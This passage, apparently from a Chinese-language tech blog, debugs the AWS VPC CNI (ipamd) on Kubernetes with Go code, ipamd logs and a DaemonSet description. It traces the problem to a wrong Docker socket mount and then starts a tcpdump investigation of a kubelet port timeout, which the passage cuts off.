k8sPod.Namespace, container: k8sPod.Container,\t&#125;\tipAddr, ok := ds.podsIP[podKey]\tif ok &#123; if ipAddr.IP == k8sPod.IP &amp;&amp; k8sPod.IP != &quot;&quot; &#123; // The caller invoke multiple times to assign(PodName/NameSpace --&gt; same IPAddress). It is not a error, but not very efficient. log.Infof(&quot;AssignPodIPv4Address: duplicate pod assign for IP %s, name %s, namespace %s, container %s&quot;, k8sPod.IP, k8sPod.Name, k8sPod.Namespace, k8sPod.Container) return ipAddr.IP, ipAddr.DeviceNumber, nil &#125; // TODO Handle this bug assert? May need to add a counter here, if counter is too high, need to mark node as unhealthy... // This is a bug that the caller invokes multiple times to assign(PodName/NameSpace -&gt; a different IP address). log.Errorf(&quot;AssignPodIPv4Address: current IP %s is changed to IP %s for pod(name %s, namespace %s, container %s)&quot;, ipAddr, k8sPod.IP, k8sPod.Name, k8sPod.Namespace, k8sPod.Container) return &quot;&quot;, 0, errors.New(&quot;AssignPodIPv4Address: invalid pod with multiple IP addresses&quot;)\t&#125;\treturn ds.assignPodIPv4AddressUnsafe(k8sPod)&#125; 日志分析第一段是无关代码，基本的一些版本信息 12342019-11-26T02:28:11.342Z [INFO]\tStarting L-IPAMD v1.5.3 ...2019-11-26T02:28:11.380Z [INFO]\tTesting communication with server2019-11-26T02:28:11.380Z [INFO]\tRunning with Kubernetes cluster version: v1.12. git version: v1.12.4+0422-clusterip-bugfix. git tree state: archive. commit: f49fa022dbe63faafd0da106ef7e05a29721d3f1. platform: linux/amd642019-11-26T02:28:11.380Z [INFO]\tCommunication with server successful main 函数开始了，通过 ec2 的 metadata 接口通过 discover 函数的实现来收集 ipamd 启动需要的信息。 1234567891011121314151617182019-11-26T02:28:11.380Z [INFO]\tStarting Pod controller2019-11-26T02:28:11.380Z [INFO]\tWaiting for controller cache sync2019-11-26T02:28:11.382Z [DEBUG]\tDiscovered region: us-east-12019-11-26T02:28:11.382Z [DEBUG]\tFound availability zone: us-east-1a2019-11-26T02:28:11.383Z [DEBUG]\tDiscovered the instance primary ip address: 10.0.10.662019-11-26T02:28:11.383Z [DEBUG]\tFound instance-id: i-0ba03a7c305eb480c2019-11-26T02:28:11.384Z [DEBUG]\tFound instance-type: c5.xlarge2019-11-26T02:28:11.384Z [DEBUG]\tFound primary interface&#x27;s MAC address: 02:43:a8:0e:05:2f2019-11-26T02:28:11.384Z [DEBUG]\tDiscovered 2 interfaces.2019-11-26T02:28:11.385Z [DEBUG]\tFound device-number: 02019-11-26T02:28:11.385Z [DEBUG]\tFound account ID: 1795166460502019-11-26T02:28:11.386Z [DEBUG]\tFound eni: eni-0debffa6dcf067b1b2019-11-26T02:28:11.386Z [DEBUG]\tFound ENI eni-0debffa6dcf067b1b is a primary ENI2019-11-26T02:28:11.392Z [DEBUG]\tFound security-group id: sg-0ade1b7b97edfbc0b2019-11-26T02:28:11.392Z [DEBUG]\tFound security-group id: sg-05c56cb6937b7cd9e2019-11-26T02:28:11.393Z [DEBUG]\tFound subnet-id: subnet-048c7f0d1e821113d2019-11-26T02:28:11.393Z [DEBUG]\tFound vpc-ipv4-cidr-block: 10.0.0.0/162019-11-26T02:28:11.394Z [DEBUG]\tFound VPC CIDR: 10.0.0.0/16 下面就是准备 node init 了，准备本地路由表，转发规则，建立本地址池。 其中建立地址池的过程概述就是获取弹性网卡，从弹性网卡上获取浮动 ip，将浮动 ip 放到进程缓存中，然后调用 k8s 接口 和 docker 接口重建本地 ip 分配关系。 12345678910111213141516171819202122232425262728292019-11-26T02:28:11.394Z [DEBUG]\tStart node init2019-11-26T02:28:11.394Z [DEBUG]\tTotal number of interfaces found: 22019-11-26T02:28:11.394Z [DEBUG]\tFound ENI mac address : 02:43:a8:0e:05:2f2019-11-26T02:28:11.395Z [DEBUG]\tUsing device number 0 for primary eni: eni-0debffa6dcf067b1b2019-11-26T02:28:11.395Z [DEBUG]\tFound ENI: eni-0debffa6dcf067b1b, MAC 02:43:a8:0e:05:2f, device 02019-11-26T02:28:11.396Z [DEBUG]\tFound CIDR 10.0.10.0/24 for ENI 02:43:a8:0e:05:2f2019-11-26T02:28:11.397Z [DEBUG]\tFound IP addresses [10.0.10.66 10.0.10.192 10.0.10.130 10.0.10.227 10.0.10.166 10.0.10.72 10.0.10.40 10.0.10.136 10.0.10.113 10.0.10.115 10.0.10.53 10.0.10.22 10.0.10.25 10.0.10.26 10.0.10.95] on ENI 02:43:a8:0e:05:2f2019-11-26T02:28:11.397Z [DEBUG]\tFound ENI mac address : 02:ef:be:01:7c:ad2019-11-26T02:28:11.398Z [DEBUG]\tFound ENI: eni-08bafec9495ebc6df, MAC 02:ef:be:01:7c:ad, device 22019-11-26T02:28:11.398Z [DEBUG]\tFound CIDR 10.0.10.0/24 for ENI 02:ef:be:01:7c:ad2019-11-26T02:28:11.399Z [DEBUG]\tFound IP addresses [10.0.10.43 10.0.10.97 10.0.10.34 10.0.10.35 10.0.10.132 10.0.10.70 10.0.10.231 10.0.10.112 10.0.10.208 10.0.10.177 10.0.10.114 10.0.10.214 10.0.10.87 10.0.10.119 10.0.10.185] on ENI 02:ef:be:01:7c:ad2019-11-26T02:28:11.399Z [INFO]\tSetting up host network...2019-11-26T02:28:11.399Z [DEBUG]\tTrying to find primary interface that has mac : 02:43:a8:0e:05:2f2019-11-26T02:28:11.399Z [DEBUG]\tDiscovered interface: lo, mac:2019-11-26T02:28:11.399Z [DEBUG]\tDiscovered interface: eth0, mac: 02:43:a8:0e:05:2f2019-11-26T02:28:11.399Z [INFO]\tDiscovered primary interface: eth02019-11-26T02:28:11.399Z [DEBUG]\tSetting RPF for primary interface: /proc/sys/net/ipv4/conf/eth0/rp_filter2019-11-26T02:28:11.400Z [DEBUG]\tSetup Host Network: iptables -N AWS-SNAT-CHAIN-0 -t nat2019-11-26T02:28:11.401Z [DEBUG]\tSetup Host Network: iptables -N AWS-SNAT-CHAIN-1 -t nat2019-11-26T02:28:11.402Z [DEBUG]\tSetup Host Network: iptables -A POSTROUTING -m comment --comment &quot;AWS SNAT CHAIN&quot; -j AWS-SNAT-CHAIN-02019-11-26T02:28:11.402Z [DEBUG]\tSetup Host Network: iptables -A AWS-SNAT-CHAIN-0 ! -d 10.0.0.0/16 -t nat -j AWS-SNAT-CHAIN-12019-11-26T02:28:11.402Z [DEBUG]\tiptableRules: [nat/POSTROUTING rule first SNAT rules for non-VPC outbound traffic nat/AWS-SNAT-CHAIN-0 rule [0] AWS-SNAT-CHAIN nat/AWS-SNAT-CHAIN-1 rule last SNAT rule for non-VPC outbound traffic]2019-11-26T02:28:11.402Z [DEBUG]\texecute iptable rule : first SNAT rules for non-VPC outbound traffic2019-11-26T02:28:11.403Z [DEBUG]\texecute iptable rule : [0] AWS-SNAT-CHAIN2019-11-26T02:28:11.403Z [DEBUG]\texecute iptable rule : last SNAT rule for non-VPC outbound traffic2019-11-26T02:28:11.404Z [DEBUG]\texecute iptable rule : connmark for primary ENI2019-11-26T02:28:11.405Z [DEBUG]\texecute iptable rule : connmark restore for primary ENI2019-11-26T02:28:11.406Z [DEBUG]\texecute iptable rule : rule for primary address 10.0.10.662019-11-26T02:28:11.407Z [DEBUG]\tDiscovered ENI eni-0debffa6dcf067b1b, trying to set it up 下面就是重建地址池分配的细节 1234567891011121314151617181920212223242526272829303132333435363738394041422019-11-26T02:28:11.481Z [INFO]\tSynced successfully with APIServer2019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod istio-telemetry-6dbd664c76-2m4x4 on my node, namespace = istio-system, IP = 10.0.10.1362019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod cni-metrics-helper-7774cb895c-cfhlh on my node, namespace = kube-system, IP = 10.0.10.1132019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod istio-galley-59fd9c6c8-vxmsn on my node, namespace = istio-system, IP = 10.0.10.222019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod kiali-7b5b867f8-hn9pg on my node, namespace = istio-system, IP = 10.0.10.1302019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod istio-citadel-864989dd69-lx72c on my node, namespace = istio-system, IP = 10.0.10.2272019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod istio-egressgateway-6bc7c7874f-dvkpx on my node, namespace = istio-system, IP = 10.0.10.1152019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod kiali-7b5b867f8-gr6bf on my node, namespace = istio-system, IP = 10.0.10.1362019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod grafana-7869478fc5-vh4fs on my node, namespace = istio-system, IP = 10.0.10.402019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod istio-ingressgateway-756fd55f-mlf9w on my node, namespace = istio-system, IP = 10.0.10.592019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod istio-tracing-79db5954f-8bkw7 on my node, namespace = istio-system, IP = 10.0.10.1662019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod istio-policy-7984978f85-s4pzk on my node, namespace = istio-system, IP = 10.0.10.532019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod istio-sidecar-injector-7dc597dfc7-n8s2k on my node, namespace = istio-system, IP = 10.0.10.952019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod metrics-server-c654cf865-rt9rp on my node, namespace = kube-system, IP = 10.0.10.952019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod istio-pilot-5cdcc74bf9-h8ghs on my node, namespace = istio-system, IP = 10.0.10.1652019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod prometheus-5b48f5d49-nvtc8 on my node, namespace = istio-system, IP = 10.0.10.1612019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod kiali-7b5b867f8-bhgh8 on my node, namespace = istio-system, IP = 10.0.10.2272019-11-26T02:28:11.481Z [INFO]\tAdd/Update for CNI pod aws-node-knkw92019-11-26T02:28:11.481Z [INFO]\tAdd/Update for CNI pod aws-node-67hv52019-11-26T02:28:11.481Z [INFO]\tAdd/Update for Pod kiali-7b5b867f8-4bcl6 on my node, namespace = istio-system, IP = 10.0.10.402019-11-26T02:28:11.564Z [DEBUG]\tDataStore Add an ENI eni-0debffa6dcf067b1b2019-11-26T02:28:11.564Z [DEBUG]\tAdding ENI(eni-0debffa6dcf067b1b)&#x27;s IPv4 address 10.0.10.192 to datastore2019-11-26T02:28:11.564Z [DEBUG]\tIP Address Pool stats: total: 0, assigned: 02019-11-26T02:28:11.564Z [INFO]\tAdded ENI(eni-0debffa6dcf067b1b)&#x27;s IP 10.0.10.192 to datastore2019-11-26T02:28:11.564Z [DEBUG]\tAdding ENI(eni-0debffa6dcf067b1b)&#x27;s IPv4 address 10.0.10.130 to datastore...2019-11-26T02:28:11.565Z [DEBUG]\tAdding ENI(eni-0debffa6dcf067b1b)&#x27;s IPv4 address 10.0.10.95 to datastore2019-11-26T02:28:11.565Z [DEBUG]\tIP Address Pool stats: total: 13, assigned: 02019-11-26T02:28:11.565Z [INFO]\tAdded ENI(eni-0debffa6dcf067b1b)&#x27;s IP 10.0.10.95 to datastore2019-11-26T02:28:11.565Z [INFO]\tENI eni-0debffa6dcf067b1b set up.2019-11-26T02:28:11.565Z [DEBUG]\tDiscovered ENI eni-08bafec9495ebc6df, trying to set it up2019-11-26T02:28:11.666Z [DEBUG]\tDataStore Add an ENI eni-08bafec9495ebc6df2019-11-26T02:28:11.666Z [INFO]\tSetting up network for an ENI with IP address 10.0.10.43, MAC address 02:ef:be:01:7c:ad, CIDR 10.0.10.0/24 and route table 22019-11-26T02:28:11.666Z [DEBUG]\tFound the Link that uses mac address 02:ef:be:01:7c:ad and its index is 77 (attempt 1/5)2019-11-26T02:28:11.666Z [DEBUG]\tSetting up ENI&#x27;s primary IP 10.0.10.432019-11-26T02:28:11.666Z [DEBUG]\tDeleting existing IP address 10.0.10.43/24 eth12019-11-26T02:28:11.667Z [DEBUG]\tAdding IP address 10.0.10.43/242019-11-26T02:28:11.667Z [DEBUG]\tSetting up ENI&#x27;s default gateway 10.0.10.12019-11-26T02:28:11.667Z [DEBUG]\tSuccessfully added route route 10.0.10.1/0 via 10.0.10.1 table 22019-11-26T02:28:11.667Z [DEBUG]\tSuccessfully added route route 0.0.0.0/0 via 10.0.10.1 table 2...2019-11-26T02:28:11.668Z [INFO]\tK8SGetLocalPodIPs discovered local Pods: grafana-7869478fc5-vh4fs istio-system 10.0.10.40 325fa5b9-0f5f-11ea-baca-0262684723a1 下面的日志就是本次问题的核心了，我还一直很奇怪为什么日志总是说 IP pool stats: total = 28, used = 0, c.maxIPsPerENI = 14 这样的信息，因为在我看来这个节点上使用 aws cni pod 的数量更本不是 0 个。 1234567891011121314151617181920212019-11-26T02:28:11.668Z [INFO]\tNot able to get local containers yet (attempt 1/5): Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?2019-11-26T02:28:11.702Z [INFO]\tAdd/Update for Pod cni-metrics-helper-7774cb895c-cfhlh on my node, namespace = kube-system, IP = 10.0.10.113...2019-11-26T02:28:14.668Z [INFO]\tNot able to get local containers yet (attempt 2/5): Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?2019-11-26T02:28:14.699Z [INFO]\tAdd/Update for CNI pod aws-node-67hv52019-11-26T02:28:15.501Z [INFO]\tAdd/Update for Pod istio-tracing-79db5954f-8bkw7 on my node, namespace = istio-system, IP = 10.0.10.1662019-11-26T02:28:15.899Z [INFO]\tAdd/Update for Pod grafana-7869478fc5-vh4fs on my node, namespace = istio-system, IP = 10.0.10.402019-11-26T02:28:16.298Z [INFO]\tAdd/Update for Pod istio-sidecar-injector-7dc597dfc7-n8s2k on my node, namespace = istio-system, IP = 10.0.10.952019-11-26T02:28:16.698Z [INFO]\tAdd/Update for Pod prometheus-5b48f5d49-nvtc8 on my node, namespace = istio-system, IP = 10.0.10.1612019-11-26T02:28:17.669Z [INFO]\tNot able to get local containers yet (attempt 3/5): Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?2019-11-26T02:28:20.669Z [INFO]\tNot able to get local containers yet (attempt 4/5): Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?2019-11-26T02:28:23.669Z [INFO]\tNot able to get local containers yet (attempt 5/5): Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?2019-11-26T02:28:26.669Z [DEBUG]\tgetLocalPodsWithRetry() found 17 used IPs.2019-11-26T02:28:26.669Z [INFO]\tSkipping Pod istio-ingressgateway-756fd55f-mlf9w, Namespace istio-system, due to no matching container2019-11-26T02:28:26.669Z [INFO]\tSkipping Pod istio-tracing-79db5954f-8bkw7, Namespace istio-system, due to no matching container2019-11-26T02:28:26.669Z [INFO]\tSkipping Pod prometheus-5b48f5d49-nvtc8, Namespace istio-system, due to no matching container2019-11-26T02:28:26.669Z [INFO]\tSkipping Pod istio-telemetry-6dbd664c76-2m4x4, Namespace istio-system, due to no matching container2019-11-26T02:28:26.669Z [INFO]\tSkipping Pod kiali-7b5b867f8-hn9pg, Namespace istio-system, due to no matching container...// 这一段都是 INFO 级别 skip 信息.2019-11-26T02:28:26.669Z [INFO]\tSkipping Pod grafana-7869478fc5-vh4fs, Namespace istio-system, due to no matching container 123456789101112131415161718192021222324func (c *IPAMContext) getLocalPodsWithRetry() ([]*k8sapi.K8SPodInfo, error) &#123;\tvar pods []*k8sapi.K8SPodInfo\tvar err error\tfor retry := 1; retry &lt;= maxK8SRetries; retry++ &#123; pods, err = c.k8sClient.K8SGetLocalPodIPs()...\tvar containers map[string]*docker.ContainerInfo\tfor retry := 1; retry &lt;= maxK8SRetries; retry++ &#123; containers, err = c.dockerClient.GetRunningContainers() // 日志就是在这个函数里面打出来的，这个时候 container id 就是空的\t// TODO consider using map\tfor _, pod := range pods &#123; // needs to find the container ID for _, container := range containers &#123; // 这里发现是空的 if container.K8SUID == pod.UID &#123; log.Debugf(&quot;Found pod(%v)&#x27;s container ID: %v &quot;, container.Name, container.ID) pod.Container = container.ID break &#125; &#125;\t&#125;\treturn pods, nil\t// 这里返回 ipamd 记录的 pod 信息里面就没有 container id&#125; 返回 getLocalPodsWithRetry 的调用方 nodeinit 函数，看一下相关逻辑，当 container id 不存在整个ip重新分配的逻辑就没有走… 没有走… 没有走… 123456789101112131415//TODO need to break this function down(comments from CR)func (c *IPAMContext) nodeInit() error &#123;...\tusedIPs, err := c.getLocalPodsWithRetry()\tlog.Debugf(&quot;getLocalPodsWithRetry() found %d used IPs.&quot;, len(usedIPs))...\tfor _, ip := range usedIPs &#123; if ip.Container == &quot;&quot; &#123; log.Infof(&quot;Skipping Pod %s, Namespace %s, due to no matching container&quot;, ip.Name, ip.Namespace) continue &#125;...\t&#125;\treturn nil&#125; 因为 ipamd 发现我们有大量 ip 申请了，但是没有用 ipamd 处于节约考虑帮我们释放了，下面就是释放的日志了。 12345678910111213141516172019-11-26T02:47:06.317Z [DEBUG]\tnodeIPPoolReconcile: skipping because time since last 51.08553629s &lt;= 1m0s2019-11-26T02:47:08.818Z [DEBUG]\tIP pool stats: total = 28, used = 0, c.maxIPsPerENI = 142019-11-26T02:47:08.818Z [DEBUG]\tIP pool is NOT too low: available (28) &gt;= ENI target (1) * addrsPerENI (14)2019-11-26T02:47:08.818Z [DEBUG]\tIP pool stats: total = 28, used = 0, c.maxIPsPerENI = 142019-11-26T02:47:08.818Z [DEBUG]\tIt might be possible to remove extra ENIs because available (28) &gt; ENI target (1) * addrsPerENI (14):2019-11-26T02:47:08.818Z [DEBUG]\tENI eni-0debffa6dcf067b1b cannot be deleted because it is primary2019-11-26T02:47:08.818Z [DEBUG]\tgetDeletableENI: found a deletable ENI eni-08bafec9495ebc6df2019-11-26T02:47:08.818Z [INFO]\tRemoveUnusedENIFromStore eni-08bafec9495ebc6df: IP address pool stats: free 14 addresses, total: 14, assigned: 02019-11-26T02:47:08.818Z [DEBUG]\tStart freeing ENI eni-08bafec9495ebc6df2019-11-26T02:47:08.818Z [INFO]\tTrying to free ENI: eni-08bafec9495ebc6df2019-11-26T02:47:08.930Z [DEBUG]\tFound ENI eni-08bafec9495ebc6df attachment id: eni-attach-0dc80c1727c8163a82019-11-26T02:47:09.398Z [INFO]\tSuccessfully detached ENI: eni-08bafec9495ebc6df2019-11-26T02:47:09.398Z [DEBUG]\tTrying to delete ENI: eni-08bafec9495ebc6df2019-11-26T02:47:09.550Z [DEBUG]\tNot able to delete ENI yet (attempt 1/20): InvalidParameterValue: Network interface &#x27;eni-08bafec9495ebc6df&#x27; is currently in use.\tstatus code: 400, request id: de8ef372-0567-4b35-8c6d-3f70110899212019-11-26T02:47:14.868Z [INFO]\tSuccessfully deleted ENI: eni-08bafec9495ebc6df2019-11-26T02:47:14.868Z [INFO]\tSuccessfully freed ENI: eni-08bafec9495ebc6df 尝试修复这个问题修复方案 1, 让 ipamd 可以正确的与 docker 通信。 1root 15066 2.9 1.4 1241172 115768 ? Ssl 09:02 0:12 /usr/bin/dockerd -H unix:///var/run/docker.sock --containerd=/run/containerd/containerd.sock 123456789101112131415161718192021222324252627282930313233guohao@pc ~ $ kubectl --kubeconfig ~/Downloads/kubeconfig -n kube-system describe ds aws-nodeName: aws-nodeSelector: k8s-app=aws-nodeNode-Selector: &lt;none&gt;Labels: k8s-app=aws-nodeAnnotations: deprecated.daemonset.template.generation: 12 kubectl.kubernetes.io/last-applied-configuration: &#123;&quot;apiVersion&quot;:&quot;apps/v1&quot;,&quot;kind&quot;:&quot;DaemonSet&quot;,&quot;metadata&quot;:&#123;&quot;annotations&quot;:&#123;&#125;,&quot;labels&quot;:&#123;&quot;k8s-app&quot;:&quot;aws-node&quot;&#125;,&quot;name&quot;:&quot;aws-node&quot;,&quot;namespace&quot;:&quot;kub...Desired Number of Nodes Scheduled: 2Current Number of Nodes Scheduled: 2Number of Nodes Scheduled with Up-to-date Pods: 1Number of Nodes Scheduled with Available Pods: 2Number of Nodes Misscheduled: 0Pods Status: 2 Running / 0 Waiting / 0 Succeeded / 0 FailedPod Template: Labels: k8s-app=aws-node Service Account: aws-node Containers: aws-node: Image: 602401143452.dkr.ecr.us-west-2.amazonaws.com/amazon-k8s-cni:v1.5.3 Port: 61678/TCP Host Port: 61678/TCP Requests: cpu: 10m Environment: AWS_VPC_K8S_CNI_LOGLEVEL: trace AWS_VPC_K8S_CNI_EXTERNALSNAT: true MY_NODE_NAME: (v1:spec.nodeName) Mounts: /host/etc/cni/net.d from cni-net-dir (rw) /host/opt/cni/bin from cni-bin-dir (rw) /host/var/log from log-dir (rw) /run/containerd/containerd.sock from dockersock (rw) /run/containerd/containerd.sock from dockersock (rw) 就是这里，本是适配社区的 containerd 做了修改，而我们自己的环境是用的 docker. 在重新看一下日志已经没有那个问题了。","tags":["k8s"]},{"title":"amzon aws cni 踩坑","path":"/2019/11/20/amazon-vpc-cni/","content":"最近要把 aws vpc cni 适配到 cluster api 已经适配完成了，发现节点重启过后 aws-node 在重启的节点上不能正常 running 导致节点上的 pod 不能正常运行。 而且使用过在 master 上使用 kubectl logs 获取 pod 运行信息失败。 12root@ip-10-0-10-69:/home/admin# kubectl -n kube-system logs aws-node-lm9nxError from server: Get https://10.0.10.207:10250/containerLogs/kube-system/aws-node-lm9nx/aws-node: dial tcp 10.0.10.207:10250: i/o timeout 也就是说 apiserver 链接不上 10.0.10.207 的 kubelet. 123admin@ip-10-0-10-69:~$ telnet 10.0.10.207 10250Trying 10.0.10.207...^C 使用 telnet 确认一下 登陆到 10.0.10.207 node 发现节点是收到 master 发起到 10250 的请求的，但是至少在网络层没有发现应答。 123456789root@ip-10-0-10-207:/home/admin# tcpdump -i eth0 port 10250 tcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes02:37:59.749261 IP ip-10-0-10-137.ec2.internal.48148 &gt; ip-10-0-10-207.ec2.internal.10250: Flags [S], seq 3114509118, win 26883, options [mss 8961,sackOK,TS val 145034504 ecr 0,nop,wscale 7], length 002:38:00.166263 IP ip-10-0-10-69.ec2.internal.36450 &gt; ip-10-0-10-207.ec2.internal.10250: Flags [S], seq 3957291899, win 26883, options [mss 8961,sackOK,TS val 145204104 ecr 0,nop,wscale 7], length 002:38:00.934330 IP ip-10-0-10-69.ec2.internal.36458 &gt; ip-10-0-10-207.ec2.internal.10250: Flags [S], seq 3138969954, win 26883, options [mss 8961,sackOK,TS val 145204296 ecr 0,nop,wscale 7], length 002:38:01.765288 IP ip-10-0-10-137.ec2.internal.48148 &gt; ip-10-0-10-207.ec2.internal.10250: Flags [S], seq 3114509118, win 26883, options [mss 8961,sackOK,TS val 145035008 ecr 0,nop,wscale 7], length 002:38:04.234328 IP ip-10-0-10-69.ec2.internal.36450 &gt; ip-10-0-10-207.ec2.internal.10250: Flags [S], seq 3957291899, win 26883, options [mss 8961,sackOK,TS val 145205120 ecr 0,nop,wscale 7], length 002:38:04.998242 IP ip-10-0-10-69.ec2.internal.36458 &gt; ip-10-0-10-207.ec2.internal.10250: Flags [S], seq 3138969954, win 26883, options [mss 8961,sackOK,TS val 145205312 ecr 0,nop,wscale 7], length 002:38:05.861341 IP ip-10-0-10-137.ec2.internal.48148 &gt; ip-10-0-10-207.ec2.internal.10250: Flags [S], seq 3114509118, win 26883, options [mss 8961,sackOK,TS val 145036032 ecr 0,nop,wscale 7], length 0 发现问题不能一下子撸清楚，只能慢慢探索链路。 ip-10-0-10-69 是 master 节点 12kubectl -n kube-system logs aws-node-lm9nxError from server: Get https://10.0.10.207:10250/containerLogs/kube-system/aws-node-lm9nx/aws-node: dial tcp 10.0.10.207:10250: i/o timeout 发现只有出的数据包，并没有回来的数据包。 12345678910111213root@ip-10-0-10-69:/home/admin# tcpdump -i any host 10.0.10.207 and port 10250 -ntcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes06:59:45.926815 IP 10.0.10.69.60944 &gt; 10.0.10.207.10250: Flags [S], seq 65945781, win 26883, options [mss 8961,sackOK,TS val 149130544 ecr 0,nop,wscale 7], length 006:59:49.318816 IP 10.0.10.69.60934 &gt; 10.0.10.207.10250: Flags [S], seq 1568373055, win 26883, options [mss 8961,sackOK,TS val 149131392 ecr 0,nop,wscale 7], length 006:59:50.086848 IP 10.0.10.69.60944 &gt; 10.0.10.207.10250: Flags [S], seq 65945781, win 26883, options [mss 8961,sackOK,TS val 149131584 ecr 0,nop,wscale 7], length 006:59:54.164908 IP 10.0.10.69.32788 &gt; 10.0.10.207.10250: Flags [S], seq 1174539368, win 26883, options [mss 8961,sackOK,TS val 149132603 ecr 0,nop,wscale 7], length 006:59:55.174808 IP 10.0.10.69.32788 &gt; 10.0.10.207.10250: Flags [S], seq 1174539368, win 26883, options [mss 8961,sackOK,TS val 149132856 ecr 0,nop,wscale 7], length 006:59:57.124514 IP 10.0.10.69.32814 &gt; 10.0.10.207.10250: Flags [S], seq 1241021276, win 26883, options [mss 8961,sackOK,TS val 149133343 ecr 0,nop,wscale 7], length 006:59:57.190814 IP 10.0.10.69.32788 &gt; 10.0.10.207.10250: Flags [S], seq 1174539368, win 26883, options [mss 8961,sackOK,TS val 149133360 ecr 0,nop,wscale 7], length 006:59:57.891175 IP 10.0.10.69.32822 &gt; 10.0.10.207.10250: Flags [S], seq 1819028184, win 26883, options [mss 8961,sackOK,TS val 149133535 ecr 0,nop,wscale 7], length 006:59:58.150818 IP 10.0.10.69.32814 &gt; 10.0.10.207.10250: Flags [S], seq 1241021276, win 26883, options [mss 8961,sackOK,TS val 149133600 ecr 0,nop,wscale 7], length 006:59:58.918835 IP 10.0.10.69.32822 &gt; 10.0.10.207.10250: Flags [S], seq 1819028184, win 26883, options [mss 8961,sackOK,TS val 149133792 ecr 0,nop,wscale 7], length 0 在 ip-10-0-10-207 节点观察，登陆判断数据流向 1234567root@ip-10-0-10-207:/home/admin# ip addr show eth02: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 9001 qdisc mq state UP group default qlen 1000 link/ether 02:00:ba:2b:02:3f brd ff:ff:ff:ff:ff:ff inet 10.0.10.207/24 brd 10.0.10.255 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::baff:fe2b:23f/64 scope link valid_lft forever preferred_lft forever 1234567root@ip-10-0-10-207:/home/admin# ip addr show eth13: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 9001 qdisc mq state UP group default qlen 1000 link/ether 02:e1:30:86:0d:35 brd ff:ff:ff:ff:ff:ff inet 10.0.10.190/24 brd 10.0.10.255 scope global eth1 valid_lft forever preferred_lft forever inet6 fe80::e1:30ff:fe86:d35/64 scope link valid_lft forever preferred_lft forever 1234567891011root@ip-10-0-10-207:/home/admin# tcpdump -n -i eth0 host 10.0.10.69 and port 10250tcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes07:03:15.143334 IP 10.0.10.69.34162 &gt; 10.0.10.207.10250: Flags [S], seq 1951564140, win 26883, options [mss 8961,sackOK,TS val 149182848 ecr 0,nop,wscale 7], length 007:03:15.911228 IP 10.0.10.69.34172 &gt; 10.0.10.207.10250: Flags [S], seq 1628830348, win 26883, options [mss 8961,sackOK,TS val 149183040 ecr 0,nop,wscale 7], length 007:03:18.472285 IP 10.0.10.69.34218 &gt; 10.0.10.207.10250: Flags [S], seq 1626614180, win 26883, options [mss 8961,sackOK,TS val 149183680 ecr 0,nop,wscale 7], length 007:03:19.239186 IP 10.0.10.69.34162 &gt; 10.0.10.207.10250: Flags [S], seq 1951564140, win 26883, options [mss 8961,sackOK,TS val 149183872 ecr 0,nop,wscale 7], length 007:03:19.499242 IP 10.0.10.69.34218 &gt; 10.0.10.207.10250: Flags [S], seq 1626614180, win 26883, options [mss 8961,sackOK,TS val 149183937 ecr 0,nop,wscale 7], length 007:03:20.007198 IP 10.0.10.69.34172 &gt; 10.0.10.207.10250: Flags [S], seq 1628830348, win 26883, options [mss 8961,sackOK,TS val 149184064 ecr 0,nop,wscale 7], length 007:03:21.511227 IP 10.0.10.69.34218 &gt; 10.0.10.207.10250: Flags [S], seq 1626614180, win 26883, options [mss 8961,sackOK,TS val 149184440 ecr 0,nop,wscale 7], length 007:03:25.639190 IP 10.0.10.69.34218 &gt; 10.0.10.207.10250: Flags [S], seq 1626614180, win 26883, options [mss 8961,sackOK,TS val 149185472 ecr 0,nop,wscale 7], length 0 12345678910111213root@ip-10-0-10-207:/home/admin# tcpdump -n -i eth1 host 10.0.10.69 and port 10250tcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes07:04:56.488272 IP 10.0.10.207.10250 &gt; 10.0.10.69.34908: Flags [S.], seq 2079765709, ack 3299090550, win 26847, options [mss 8961,sackOK,TS val 492099 ecr 149208184,nop,wscale 7], length 007:04:57.124636 IP 10.0.10.207.10250 &gt; 10.0.10.69.34924: Flags [S.], seq 899903279, ack 2422028185, win 26847, options [mss 8961,sackOK,TS val 492258 ecr 149208343,nop,wscale 7], length 007:04:57.499734 IP 10.0.10.207.10250 &gt; 10.0.10.69.34812: Flags [S.], seq 3175686817, ack 1025375908, win 26847, options [mss 8961,sackOK,TS val 492352 ecr 149204593,nop,wscale 7], length 007:04:57.499757 IP 10.0.10.207.10250 &gt; 10.0.10.69.34908: Flags [S.], seq 2079765709, ack 3299090550, win 26847, options [mss 8961,sackOK,TS val 492352 ecr 149208184,nop,wscale 7], length 007:04:57.511095 IP 10.0.10.207.10250 &gt; 10.0.10.69.34908: Flags [S.], seq 2079765709, ack 3299090550, win 26847, options [mss 